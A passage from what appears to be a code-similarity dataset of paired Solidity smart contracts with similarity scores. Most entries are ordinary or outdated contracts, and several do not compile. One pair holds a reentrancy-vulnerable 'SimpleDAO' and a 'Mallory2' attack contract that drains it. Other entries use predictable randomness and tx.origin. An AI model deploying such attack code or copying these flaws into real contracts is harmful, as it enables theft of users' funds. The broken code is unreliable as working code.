    if (_currentOwner != msg.sender) {
        return false;
    }
    _nextOwner = nextOwner;
    return true;
}

function confirmOwnership() returns(bool confirmed) {
    if (_nextOwner != msg.sender) {
        return false;
    }
    _owners.push(_nextOwner);
    _currentOwner = _nextOwner;
    _nextOwner = address(0);
    return true;
}

function getOwner() constant returns(address owner) {
    return _currentOwner;
}

function getOwners() constant returns(address[] owners) {
    return _owners;
}

function getProduct() returns (string product) {
    return _productDigest;
}
}",0.6360287907138592,"contract Ownable {

    address private _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    

    constructor () internal {

        _owner = msg.sender;

        emit OwnershipTransferred(address(0), _owner);

    }



    

    function owner() public view returns (address) {

        return _owner;

    }



    

    modifier onlyOwner() {

        require(isOwner(), ""The caller must be owner"");

        _;

    }



    

    function isOwner() public view returns (bool) {

        return msg.sender == _owner;

    }



    

    function transferOwnership(address newOwner) public onlyOwner {

        _transferOwnership(newOwner);

    }



    

    function _transferOwnership(address newOwner) internal {

        require(newOwner != address(0), ""Cannot transfer control of the contract to the zero address"");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}"
"contract SimpleDAO {
    mapping (address => uint256) public credit;
    bool flag = true;

    constructor() payable public {
        donate();
    }

    function donate() payable public{
        credit[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public{
        require(flag, ""Only one time call is allowed."");
        flag = false;
        if (credit[msg.sender]>= amount) {
            msg.sender.call.value(amount)("""");
            credit[msg.sender]-=amount;
        }
    }

    function queryCredit(address to) public view returns (uint256) {
        return credit[to];
    }
}",0.6831637531339928,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function deposit() payable public {

        emit Deposit(msg.value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract Mallory2 {
  SimpleDAO public dao;
  address payable owner; 

  constructor(SimpleDAO addr) public payable{
    owner = msg.sender;
    dao = addr;
  }

  function attack() public payable{
    dao.donate.value(1)();
    dao.withdraw(1);
  }

  function getJackpot() public{
    dao.withdraw(address(dao).balance);
    owner.transfer(address(this).balance);
  }

  function() external payable{
       dao.withdraw(1);
  }
}",0.6678607138218948,"contract mySender{



    address public owner;



    constructor() public payable{

        owner = msg.sender;        

    }



    function multyTx(address[100] addrs, uint[100] values) public {

        require(msg.sender==owner);

        for(uint256 i=0;i<addrs.length;i++){

            addrs[i].transfer(values[i]);

        }

    }



    

    function withdraw() public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }



    function () public payable{}   

}"
"contract TestContract is SafeMath {
    struct Result {
        bytes32 name;
        uint256 balance;
        mapping (address => uint256) betBalances;
    }

    function TestContract(bytes32[] _resultNames) {
        for (uint i = 0; i < _resultNames.length; i++) {
            results.push(Result({
            name: _resultNames[i],
            balance: 0
            }));
        }
    }

    function getBetBalance(uint resultIndex) public validResultIndex(resultIndex) constant returns (uint256) {
        return results[resultIndex].betBalances[msg.sender];
    }

    function bet(uint resultIndex) public hasNotEnded payable {
        Result storage result = results[resultIndex];
        result.balance = safeAdd(result.balance, msg.value);
        result.betBalances[msg.sender] = safeAdd(result.betBalances[msg.sender], msg.value);
    }
}",0.6130409151657565,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;



  uint256 _totalSupply;



  

  modifier onlyPayloadSize(uint size) {

    if(msg.data.length < size + 4) {

      revert();

    }

    _;

  }



  

  function totalSupply() public view returns (uint256) {

    return _totalSupply;

  }



  

  function transfer(address _to, uint256 _value) public onlyPayloadSize(2 * 32) returns (bool) {

    require(_to != address(0));

    require(_value <= balances[msg.sender]);



    

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }



}"
"contract Test {  
  struct person {  
    uint id;
    string name;
  }

  person[] p;
  function addPerson (string _name) returns (bool added) {  
    person memory per;
    per.id = msg.sender;
    per.name = _name;
    p.push[per];
  }

  function getPerson (address a) constant returns (address d, string n) {  
    for (uint k = 0; k <= k++) {  
      if (p[k].id == a)  {
        d = p[k].id;
        n = p[k].name;
      }
    }
  }
}",0.6015904151313207,"contract NameTracker {
  address creator;
  string public name;

  function NameTracker(string initialName) {
    creator = msg.sender;
    name = initialName;
  }
  
  function update(string newName) {
    if (msg.sender == creator) {
      name = newName;
    }
  }

  function getBlockNumber() constant returns (uint)
  {
    return block.number;
  }

  function kill() {
    if (msg.sender == creator) suicide(creator);
  }
}"
"contract Campaign {

    struct Request {
        string description;
        uint256 value;
        address recipient;
        bool complete;
        uint256 approvalCount;
        mapping (address => bool) approvers;

    }
    address public manager;
    uint256 public minimumContribution;
    mapping(address=> bool) public approvers; 
    Request[] public requests;
    uint256 public approversCount;

    modifier restricted() {
        require (msg.sender == manager);
        _;
    }

     constructor (uint256 minimum, address creator) public {
         manager = creator;
         minimumContribution = minimum;
     }

     function contribute() public payable {
         require (msg.value > minimumContribution);
         approvers[msg.sender] = true;
         approversCount++;
     }

     function createRequest(string memory description, uint256 value, address recipient) public restricted {
         Request memory newRequest = Request({
             description: description,
             value: value,
             recipient: recipient,
             complete: false,
             approvalCount: 0
         });

         requests.push(newRequest);

     }

     function approveRequest(uint256 index) public {
         Request storage request = requests[index];
         require(approvers[msg.sender]);
         require(!request.approvers[msg.sender]);
         request.approvers[msg.sender] = true;
         request.approvalCount++;
     }

     function finalizeRequest(uint256 index) public payable {
         Request storage request = requests[index];
         require(!request.complete);
         require(request.approvalCount > (approversCount / 2));
         address payable recipient = address(uint160(request.recipient));
         recipient.transfer(request.value);
         request.complete = true;
     }

}",0.6129602360137811,"contract InterestTest is Base {
    
    address public creator;
    address public OwnerO; 
    address public Owner1;
    uint256 public etherLimit = 2 ether;
    
    mapping (address => uint256) public balances;
    mapping (address => uint256) public interestPaid;

    function initOwner(address owner) {
        OwnerO = owner;
    }
    
    function initOwner1(address owner) internal {
        Owner1 = owner;
    }
    
    
    
    function InterestTest(address owner1, address owner2) {
        creator = msg.sender;
        initOwner(owner1);
        initOwner1(owner2);
    }

    function() payable {
        if (msg.value >= etherLimit) {
            uint amount = msg.value;
            balances[msg.sender] += amount;
        }
    }

    
    
    function deposit(address sender) payable {
        if (msg.value >= 2) {
            uint amount = msg.value;
            balances[sender] += amount;
            Deposit(sender, msg.value);
        }
    }
    
    
    
    function calculateInterest(address investor, uint256 interestRate) returns (uint256) {
        return balances[investor] * (interestRate) / 100;
    }

    function payout(address recipient, uint256 weiAmount) {
        if ((msg.sender == creator || msg.sender == Owner0 || msg.sender == Owner1)) {
            if (balances[recipient] > 0) {
                recipient.send(weiAmount);
                PayInterest(recipient, weiAmount);
            }
        }
    }
    
    function currentBalance() returns (uint256) {
        return this.balance;
    }
    
    
        
    
    function payInterest(address recipient, uint256 interestRate) {
        if ((msg.sender == creator || msg.sender == Owner0 || msg.sender == Owner1)) {
            uint256 weiAmount = calculateInterest(recipient, interestRate);
            interestPaid[recipient] += weiAmount;
            payout(recipient, weiAmount);
        }
    }
}"
"contract Project {
    address public founder;
    constructor () public {
        founder = msg.sender;
    }
    function createRequest(string _title) public returns (address) {
        address addrRequest = new Request(_title);
        return addrRequest;
    }
}",0.6694104547751123,"contract ManagerContract {

  address public owner;



  constructor() public {

    owner = msg.sender;

  }



  modifier restricted() {

    if (msg.sender == owner) _;

  }



  function upgrade(address new_address) public restricted {

    owner = new_address;

  }

}"
"contract Request {
    string public title;
    constructor(string _title) public {
        title = _title;
    }
}",0.6303785263762929,"contract Reclaimable is Ownable {

    
    constructor() public payable {
    }

    
    function() public payable {
    }
}"
"contract AccessControl {
    mapping (address => bool) authorized;

    function getSomething () public view returns (string) { 
        
        return ""hello"";
    }
}",0.6626667855555731,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract User {
    mapping(uint=>address) addresses;
    uint addressRegistryCount;   

    function set(address userAddress) public {
        addresses[addressRegistryCount] = userAddress;
        addressRegistryCount++;
    }

    function get(address userAddress) public view returns (uint) {
        for (uint i = 0; i <= addressRegistryCount; i++) {
            if(addresses[i] == userAddress)
                return i;
        }
    }

    
}",0.6626421060122678,"contract FilterAddress is Admin{
  mapping (address => uint) public AccessAddress;
    
  function SetAccess(address addr, uint access) onlyAdmin public{
    AccessAddress[addr] = access;
  }
    
  function GetAccess(address addr) public constant returns(uint){
    return  AccessAddress[addr];
  }
    
  modifier checkFilterAddress(){
    require(AccessAddress[msg.sender] != 1);
    _;
  }
}"
"contract A {
  function passAddress(address[] _addr) {
    
  }
}",0.6537278100093222,contract Dividend { function setReseller ( address ){}}
"contract Test2 
{
    address testVal;
    constructor() 
            {testVal= msg.sender;    } 

   function getMSGSender() view returns ( address) {
     return testVal;
   }
}",0.6367072264297399,"contract Owner {

    

    function owner() public view returns (address);

    

    

    function isValidOwner(address _address) public view returns(bool);



}"
"contract Contribution {
  string data;
  bool forSale;
  address owner;

  function Contribution(string _data, address _contributor) {
    data = _data;
    owner = _contributor;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function offer() public payable {
    require(msg.value > 0);
    require(forSale == true);
    forSale = false;
  }

  function deny() public onlyOwner {
    require(forSale == true);
    forSale = true;
  }

  function claim() public onlyOwner {
    require(address(this).balance > 0);
    selfdestruct(owner);
  }
}",0.6635944786893901,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function deposit() payable public {

        emit Deposit(msg.value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract ApprovalContracts { 

  address public sender;   
  address public receiver; 
  address public approver = 0xc7780C9521C2C2abED69f0D65BEbF9794C55ae94;  

  function deposit(address _receiver) external payable {  

    require(msg.value >0); 
    sender = msg.sender; 
    receiver = _receiver;
  }

  function viewApprover() external pure returns(address) { 
    return(approver);
  }

  function approve() external { 
    require(msg.sender == approver); 
    receiver.payable(address(this).balance);
  }

}",0.6078428684260709,"contract ERC20 is ERC20Basic {

  function allowance(address owner, address spender)

    public view returns (uint256);



  function transferFrom(address from, address to, uint256 value)

    public returns (bool);



  function approve(address spender, uint256 value) public returns (bool);

  event Approval(

    address indexed owner,

    address indexed spender,

    uint256 value

  );



  function () public payable {

    revert();

  }

}"
"contract Users {
    
    struct User {
        bytes32 name;
        bytes32 email;
    }

    
    mapping(uint => User[]) internal users;

    
    
    uint[] internal keys;

    function signUp(bytes32 name, bytes32 email) public {
        
        uint key = now / 1 days;

        
        if (users[key].length == 0) keys.push(key);

        
        users[key].push(User(name, email));
    }

    

    
    
    function getKeys() public view returns (uint[]) {
        return keys;
    }

    

    
    function getUsers(uint key) public view returns(User[]) {
        return users[key];
    }

    
    

    
    function getUsersCount(uint key) public view returns (uint) {
        return users[key].length;
    }

    
    

    
    function getUser(uint key, uint index) public view returns(User) {
        return users[key][index];
    }

    
    function getUserModified(uint key, uint index) public view returns(bytes32, bytes32) {
        User memory user = users[key][index];
        return (user.name, user.email);
    }

    
    
    

    
    
    
}",0.6057360572713923,"contract InstaMemory {

    
    mapping (address => mapping (uint => bytes32)) internal mbytes; 
    
    mapping (address => mapping (uint => uint)) internal muint; 
    
    mapping (address => mapping (uint => address)) internal maddr; 

    
    function setBytes(uint _id, bytes32 _byte) public {
        mbytes[msg.sender][_id] = _byte;
    }

     
    function getBytes(uint _id) public returns (bytes32 _byte) {
        _byte = mbytes[msg.sender][_id];
        delete mbytes[msg.sender][_id];
    }

     
    function setUint(uint _id, uint _num) public {
        muint[msg.sender][_id] = _num;
    }

    
    function getUint(uint _id) public returns (uint _num) {
        _num = muint[msg.sender][_id];
        delete muint[msg.sender][_id];
    }

     
    function setAddr(uint _id, address _addr) public {
        maddr[msg.sender][_id] = _addr;
    }

    
    function getAddr(uint _id) public returns (address _addr) {
        _addr = maddr[msg.sender][_id];
        delete maddr[msg.sender][_id];
    }

}"
"contract UserRegistry {

    address owner;

    struct user {
        uint dateAdded;
        uint repuation;
    }

    mapping(address => user) users;

    modifier IsUser(address account) {
        require(
            users[account].dateAdded != 0   
        );
        _;
    }

    modifier OwnerApproved() {
        require(
            msg.sender == owner
        );
        _;
    }

     constructor(address _owner) public {
        owner = _owner;
    }
}",0.6521727900571752,"contract Ownable {
    address owner_;
    constructor() public {owner_ = msg.sender;}
    modifier onlyOwner() {require(msg.sender == owner_);_;}
    function transferOwnership(address newOwner) public onlyOwner {require(newOwner != address(0));owner_ = newOwner;}
    function owner() public view returns (address) {return owner_;}
}"
"contract User is UserRegistry {

    event EventAddUser(address account);

    function addUser(address account) public {
        users[account].dateAdded = now;

        emit EventAddUser(account);
    }

    function updateUserRep(address _user) public IsUser(_user) OwnerApproved {
        users[_user].repuation +=  1;
    }

}",0.6363389396401846,"contract V00_UserRegistry {

    



    event NewUser(address _address, address _identity);



    



    

    mapping(address => address) public users;



    



    

    function registerUser()

        public

    {

        users[tx.origin] = msg.sender;

        emit NewUser(tx.origin, msg.sender);

    }



    

    function clearUser()

        public

    {

        users[msg.sender] = 0;

    }

}"
"contract App {
  bytes1 public myVar;
  function App() {
    myVar = 0x01;
  }
}",0.6093356576835117,"contract Medianizer {

    function read() public view returns (bytes32);

}"
"contract stringsContract {
    function takesTwo(string memory str, uint idx) public pure returns (bytes memory) {
        bytes memory bytesStr = bytes(str);
        return bytesStr[idx];
    }
}",0.612519856629733,"contract Validator {

    function verify(bytes32 r, bytes32 s, uint8 v, bytes32 messageHash) public pure returns (address) {

        return ecrecover(messageHash, v, r, s);

    }

}"
"contract FantasyLeague {

address public commissioner;

uint[] public proposals;
address[] public members;
address[] public rightsGiven;


constructor() public payable {
    commissioner = msg.sender;
}

function giveRightToVote(address) public payable {
    require(msg.sender == commissioner);
    
    rightsGiven.push();
}",0.6420370367888332,"contract OOOOOO {

    address public owner;

	address public Defaultaddress;

	address public Contractaddress;

	

    constructor() public {

        owner = msg.sender;

    }



	modifier restricted {

        require(msg.sender == owner);

        _;

    }

	

	function UpdateContractaddress(address NewAddress) public restricted {

        Contractaddress = NewAddress;

    }



}"
"contract GameItem is ERC721 {
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIds;

    constructor() ERC721(""GameItem"", ""ITM"") public {
    }

    function awardItem(address player, string memory tokenURI) public returns (uint256) {
        _tokenIds.increment();

        uint256 newItemId = _tokenIds.current();
        _mint(player, newItemId);
        _setTokenURI(newItemId, tokenURI);

        return newItemId;
    }
}",0.6117687708313615,"contract SuperFan is ERC721 

{

	constructor() public {}

	

	event LogToken(address user, uint256 idToken, uint256 amount);

	

	function getToken(uint256 option, string struri) public payable

	{

	

		Token memory _token = Token({

			price: msg.value,

			pack : option,

			uri : struri

		});



		uint256 newTokenId = totalSupply++;

		tokens[newTokenId] = _token;

		

		_transfer(0x0, msg.sender, newTokenId);

		

		

	}

	

}"
"contract ExampleContract {
    string public Name;

    function ExampleContract (string name) public {
        Name = name;
    }
}",0.6183712176320134,"contract TokenInterface is ERC20 {

  string public name;

  string public symbol;

  uint public decimals;

}"
"contract Factory {
    address[] public contracts;

    function createContract(string name) public returns(address)  {
        address newContract = new ExampleContract(name);
        contracts.push(newContract);
        return newContract;
    }
}",0.6016487060420911,"contract MineContractAddress {
    function mine(
        address _account, 
        uint _nonce
    ) public pure returns(address _contract) {
        if (_nonce == 0) _nonce = 128;
        _contract = address(keccak256(bytes2(0xd694), _account, byte(_nonce)));
    }
}"
"contract Simplest {
    uint x;

    constructor(bool _lucky) public {
        if (_lucky == true) {
            x = 7;
        } else {
            x = 13;
        }
    }

    function view_x() public view returns (uint) {
        return x;
    }
}",0.6908325711620134,"contract SimpleStorageKevin {

    

    

    uint x = 316;



    

    function setKevin(uint newValue)

        public

    {

        x = newValue;

    }

    

    

    function getKevin()

        public

        view

        returns (uint) 

    {

        return x;

    }

}"
"contract Aion {
uint256 public serviceFee;
function ScheduleCall(uint256 blocknumber, address to, uint256 value, uint256 gaslimit, uint256 gasprice, bytes data, bool schedType) public payable returns (uint);
function cancellScheduledTx(uint256 blocknumber, address from, address to, uint256 value, uint256 gaslimit, uint256 gasprice,
                     uint256 fee, bytes data, uint256 aionId, bool schedType) external returns(bool);

}",0.6498840210094845,"contract ERC20Basic {
  function approve(address _spender, uint256 _value) returns (bool success) {}
  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
  uint256 public totalSupply;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);

}"
"contract test {
    function a() public {
        L(1);
        revert();
    }

    event L(uint256 n);
}",0.6507037072219121,"contract Mintable {
    function mint(address to, uint256 amount) public;
}"
"contract MyDeal {

  
  address public owner;
  
  address public buyerAddr;

  
  struct Buyer {
    address addr;
    string name;

    bool init;
  }
  
  struct Order {
    string goods;
    uint quantity;
    uint number;
    uint price;
    uint safepay;
    uint deliveryDate;

    bool init;
  }
  
  struct Invoice {
    uint orderno;
    uint number;

    bool init;
  }

  
  mapping (uint => Order) orders;
  
  mapping (uint => Invoice) invoices;


  
  uint public orderseq;
  
  uint public invoiceseq;

  
  event BuyerRegistered(address buyer, string name);
  
  event OrderSent(address buyer, string goods, uint quantity, uint orderno);
  
  event PriceSent(address buyer, uint orderno, uint price);
  
  event SafepaySent(address buyer, uint orderno, uint value, uint now);
  
  event InvoiceSent(address buyer, uint invoiceno, uint orderno, uint delivery_date);
  
   event OrderDelivered(address buyer, uint invoiceno, uint orderno, uint real_delivey_date,
   address owner);

  
  constructor(address _buyerAddr) public {
    
    owner = msg.sender;
    buyerAddr = _buyerAddr;
  }


    function getOwner() view public returns (address) {
        return owner;
    }
    function getBuyer() view public returns (address) {
        return buyerAddr;
    }
    function getInvoiceseq() view public returns (uint) {
        return invoiceseq;
    }
    function getOrderseq() view public returns (uint) {
        return orderseq;
    }
    function getMsgSender() view public returns (address) {
        return msg.sender;
    }

  
  function sendOrder(string goods, uint quantity) payable public {
    
    require(msg.sender == buyerAddr);
    
    orderseq++;
    
    orders[orderseq] = Order(goods, quantity, orderseq, 0, 0, 0, true);
    
    emit OrderSent(msg.sender, goods, quantity, orderseq);
  }

  
  
  function queryOrder(uint number) constant public returns (address buyer, string goods, uint quantity, uint price, uint safepay) {
    
    require(orders[number].init);
    
    return(buyerAddr, orders[number].goods, orders[number].quantity, orders[number].price, orders[number].safepay);
  }

  
  function sendPrice(uint orderno, uint price) payable public {
    
    require(msg.sender == owner);
    
    require(orders[orderno].init);
    
    orders[orderno].price = price;
    
    emit PriceSent(buyerAddr, orderno, price);
  }

  
  
  
  function sendSafepay(uint orderno) payable public {
    
    require(orders[orderno].init);
    
    require(buyerAddr == msg.sender);
    
    require((orders[orderno].price) == msg.value);
    orders[orderno].safepay = msg.value;
    emit SafepaySent(msg.sender, orderno, msg.value, now);
  }

  
  
  function sendInvoice(uint orderno, uint delivery_date) payable public {
    
    require(orders[orderno].init);
    
    require(owner == msg.sender);
    invoiceseq++;
    
    invoices[invoiceseq] = Invoice(orderno, invoiceseq, true);
    
    orders[orderno].deliveryDate = delivery_date;
    
    emit InvoiceSent(buyerAddr, invoiceseq, orderno, delivery_date);
  }

  
  
  function getInvoice(uint invoiceno) constant public returns (address buyer, uint orderno, uint delivery_date){
    
    require(invoices[invoiceno].init);
    Invoice storage _invoice = invoices[invoiceno];
    Order storage _order     = orders[_invoice.orderno];
    return (buyerAddr, _order.number, _order.deliveryDate);
  }

  
  function delivery(uint invoiceno, uint timestamp) payable public {
    
    require(invoices[invoiceno].init);
    Invoice storage _invoice = invoices[invoiceno];
    Order storage _order     = orders[_invoice.orderno];
    
    require(msg.sender == owner);
    emit OrderDelivered(buyerAddr, invoiceno, _order.number, timestamp, owner);
    
    owner.transfer(_order.safepay);
  }

  function health() pure public returns (string) {
    return ""running"";
  }
}",0.6251743166843333,"contract Line {



    address private owner;



    uint constant public jackpotNumerator = 50;

    uint constant public winNumerator = 5;

    uint constant public giftNumerator = 1;

    uint constant public denominator = 100;

    uint constant public ownerDenominator = 100;



    uint public jackpot = 0;



    address[] internal addresses;

    mapping(address => SpinRec) internal spinsByAddr;

    mapping(bytes32 => SpinRec) internal spinsByQuery;



    struct SpinRec {

        uint id;

        bytes32 queryId;

        uint bet;

        uint token;

    }



    event Jackpot(uint line, address addr, uint date, uint prize, uint left);

    event Win(uint line, address addr, uint date, uint prize, uint left);

    event Gift(uint line, address addr, uint date, uint prize, uint left);

    

    event Spin(address addr, uint bet, uint jackpot, bytes32 queryId);

    event Reveal(uint line, address addr, uint bet, bytes32 queryId);



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function getQueryId() constant public returns (uint256) {

        return uint256(spinsByAddr[msg.sender].queryId);

    }



    function getTokenFor(uint256 queryId) constant public returns (uint) {

        return spinsByQuery[bytes32(queryId)].token;

    }



    function getToken() constant public returns (uint) {

        return spinsByAddr[msg.sender].token;

    }



    function getQueryIdBytes() constant public returns (bytes32) {

        return spinsByAddr[msg.sender].queryId;

    }



    function getTokenForBytes(bytes32 queryId) constant public returns (uint) {

        return spinsByQuery[queryId].token;

    }



    function revealResult(uint token, bytes32 queryId) internal {



        SpinRec storage spin = spinsByQuery[queryId];



        require(spin.id != 0);



        spin.token = token;

        address player = addresses[spin.id];

        spinsByAddr[player].token = token;



        emit Reveal(token, player, spin.bet, queryId);



        uint prizeNumerator = 0;



        if (token == 444) {

            prizeNumerator = jackpotNumerator;

        } else if (token == 333 || token == 222 || token == 111) {

            prizeNumerator = winNumerator;

        } else if (token%10 == 4 || token/10%10 == 4 || token/100%10 == 4) {

            prizeNumerator = giftNumerator;

        }



        uint balance = address(this).balance;

        uint prize = 0;

        if (prizeNumerator > 0) {

            prize =  balance / 100 * prizeNumerator;

            if (player.send(prize)) {

                if (prizeNumerator == jackpotNumerator) {

                    emit Jackpot(token, player, now, prize, balance);

                } else if (prizeNumerator == winNumerator) {

                    emit Win(token, player, now, prize, balance);

                } else {

                    emit Gift(token, player, now, prize, balance);

                }

                owner.transfer(spin.bet / ownerDenominator);

            }

        }

    }

    

    function recordSpin(bytes32 queryId) internal {

        

        SpinRec storage spin = spinsByAddr[msg.sender];



        if (spin.id == 0) {



            msg.sender.transfer(0 wei); 



            spin.id = addresses.length;

            addresses.push(msg.sender);

        }



        spin.bet = msg.value;

        spin.queryId = queryId;

        spinsByQuery[queryId] = spin;

    }

    

    constructor() public {

        

        delete addresses;

        addresses.length = 1;

        owner = msg.sender;

    }



    function waiver() private {

        

        delete owner;

    }

    

    function reset() onlyOwner public {

        

        owner.transfer(address(this).balance);

    }



    uint nonce;



    function random() internal returns (uint) {



        bytes32 output = keccak256(abi.encodePacked(now, msg.sender, nonce));



        uint rand = uint256(output) % 1024;

        nonce++;

        return rand;

    }



    function() payable public {

        

        require(msg.value > 10);

        jackpot += msg.value;



        uint rand = random();

        bytes32 queryId = bytes32(nonce);



        recordSpin(queryId);



        emit Spin(msg.sender, msg.value, jackpot, queryId);



        revealResult(rand%345+100, queryId);

    }

}"
"contract EthWallet is Mortal {

function ethWallet() {
}

function receiveFunds() payable {

}

function sendFunds(address receiver, uint amount) {
    receiver.transfer(amount);
}",0.6772775397797274,"contract token {
	function transferFrom(address sender, address receiver, uint amount) returns(bool success) {}

	function burn() {}
	
	function setStart(uint newStart) {}
}"
"contract Producer {
  uint8 public SOME_VALUE=12;
}",0.6636378264053576,"contract Precision {
  uint8 public decimals;
}"
"contract xyzToken {
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    function xyzToken (uint256 _initialSupply) public {
        balanceOf[msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }
}",0.6891495187498597,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  uint256 totalSupply_;

  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

}"
"contract SimpleStorage { 

    uint public storedData;

      function SimpleStorage(uint initialValue) {
        storedData = initialValue;
       }

       function set(uint x) {
        storedData = x;
         }

       function get() constant returns (uint retVal) {
        return storedData;
       }

    }",0.6284297288144105,"contract Example is Upgradeable {
    uint _value;
    
    function initialize() public {
        _sizes[bytes4(keccak256(""getUint()""))] = 32;
    }
    
    function getUint() public view returns (uint) {
        return _value;
    }
    
    function setUint(uint value) public {
        _value = value;
    }
}"
"contract DeveloperCrowdsale is Ownable {
  using SafeMath for uint256;

  
  uint256 public maxTokens = 100000000 *(10 ** 18);
  uint256 public tokensForEcosystem = 80000000 *(10 ** 18);
  uint256 public tokensForBounty = 4000000 *(10 ** 18);
  uint256 public totalTokensForSale = 15000000 *(10 ** 18);
  uint256 public tokenForAirdrop = 1000000 *(10 ** 18);

  ERC20 public token;

  address public wallet;

  uint256 public rate;

  uint256 public weiRaised;

  uint256 public cap;
  uint256 public goal;

  
  uint256 public startTime;
  uint256 public endTime;

  bool public mintingFinished = false;

  mapping(address => uint256) balances;

  event Mint(address indexed to, uint256 amount);
  event MintFinished();
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);

  constructor() public {
    rate = 1000;
    wallet = msg.sender;
    token = new DeveloperToken();
    startTime = 1527186660000;  
    endTime = 1529951340000; 
    cap = 42500 *(10 ** 18);
    goal = 7500 *(10 ** 18);
  }

  function () external payable {
    uint256 tokensThatWillBeMintedAfterPurchase = msg.value.mul(rate);
    require(token.totalSupply() + tokensThatWillBeMintedAfterPurchase < totalTokensForSale);
    buyTokens(msg.sender);
  }

  
  function setCrowdsalePrice() public onlyOwner {
      if (weiRaised <= 2500000 *(10 ** 18)) {
        setCurrentRate(1000);
      } else if (weiRaised <= 5000000 *(10 ** 18)) {
        setCurrentRate(500);
      } else if (weiRaised <= 10000000 *(10 ** 18)) {
        setCurrentRate(333);
      } else if (weiRaised <= 15000000 *(10 ** 18)) {
        setCurrentRate(250);
      }
  }

  
  function setCurrentRate(uint256 _rate) private {
      rate = _rate;
  }

  function buyTokens(address _beneficiary) public payable {
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);

    _forwardFunds();
  }

  function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
    token.transfer(_beneficiary, _tokenAmount);

  }

  function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

  function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {
    return _weiAmount.mul(rate);
  }

  function _forwardFunds() internal {
    token.totalSupply() + msg.value.mul(rate);
    wallet.transfer(msg.value);
  }

  
  function finish(address _airdrop, address _ecosystemFund, address _bountyFund) public onlyOwner {
    require(!mintingFinished);
    require(hasEnded());
    uint256 alreadyMinted = token.totalSupply();
    require(alreadyMinted < maxTokens);

    uint256 unsoldTokens = totalTokensForSale - alreadyMinted;
    if (unsoldTokens > 0) {
      tokensForEcosystem = tokensForEcosystem + unsoldTokens;
    }

    token.totalSupply().add(tokensForEcosystem);
    token.totalSupply().add(tokensForBounty);
    token.totalSupply().add(tokenForAirdrop);

    balances[_airdrop].add(tokenForAirdrop);
    balances[_ecosystemFund].add(tokensForEcosystem);
    balances[_bountyFund].add(tokensForBounty);
    mintingFinished = true ;
  }

  
  function validPurchase() internal view returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase && withinCap;
  }

  
  function hasEnded() public view returns (bool) {
    bool capReached = weiRaised >= cap;
    return now > endTime || capReached;
  }

}",0.6803876266955904,"contract Crowdsale is Ownable {
  using SafeMath for uint256;
  
  uint256 public softcap;
  
  mapping(address => uint) public balancesSoftCap;
  struct BuyInfo {
    uint summEth;
    uint summToken;
    uint dateEndRefund;
  }
  mapping(address => mapping(uint => BuyInfo)) public payments;
  mapping(address => uint) public paymentCounter;
  
  Wolf public token;
  
  
  uint256 public startICO;
  
  uint256 public endICO;
  uint256 public period;
  uint256 public endICO14; 
  
  uint256 public hardCap;
  uint256 public totalICO;
  
  uint256 public rate;   
  
  address public wallet;
  
  uint256 public minNumbPerSubscr; 
  uint256 public maxNumbPerSubscr; 


  event TokenProcurement(address indexed contributor, address indexed beneficiary, uint256 value, uint256 amount);
  function Crowdsale() public {
    token = createTokenContract();
    
    softcap = 100 * 1 ether;   
    
    minNumbPerSubscr = 10000000000000000; 
    maxNumbPerSubscr = 100 * 1 ether;
    
    
    startICO = 1521878400;
    period = 30;
    
    endICO = startICO + period * 1 days;
    endICO14 = endICO + 14 * 1 days;
    
    hardCap = 65000000000 * 1 ether;
    
    rate = 1000000;
    
    wallet = 0x7472106A07EbAB5a202e195c0dC22776778b44E6;
  }

  function setStartICO(uint _startICO) public onlyOwner{
    startICO = _startICO;
    endICO = startICO + period * 1 days;
    endICO14 = endICO + 14 * 1 days;    
  }

  function setPeriod(uint _period) public onlyOwner{
    period = _period;
    endICO = startICO + period * 1 days;
    endICO14 = endICO + 14 * 1 days;    
  }
  
